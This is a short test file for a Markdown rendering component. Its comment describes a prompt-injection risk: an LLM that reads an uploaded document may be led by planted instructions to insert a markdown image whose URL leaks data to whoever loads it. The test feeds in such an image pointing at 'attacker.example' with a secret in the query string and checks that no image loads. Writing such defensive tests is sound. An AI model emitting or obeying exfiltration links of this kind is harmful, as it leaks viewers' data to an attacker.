import { describe, expect, it } from 'vitest';
import { Markdown } from '@/components/shared/markdown';
import { renderInto } from '@/lib/test-render';

describe('Markdown', () => {
  // Issue text comes from an LLM that read the uploaded document, so a planted
  // instruction can put an image in it. Rendering it would make every viewer's
  // browser request the URL, leaking whatever the URL carries.
  it('never loads an image from the markdown, keeping its alt text', async () => {
    const { container, unmount } = await renderInto(
      <Markdown>{'Finding.\n\n![the chart](https://attacker.example/p.png?d=secret)'}</Markdown>,
    );

    expect(container.querySelector('img')).toBeNull();
    expect(container.innerHTML).not.toContain('attacker.example');
    expect(container.textContent).toContain('the chart');
    await unmount();
  });
});
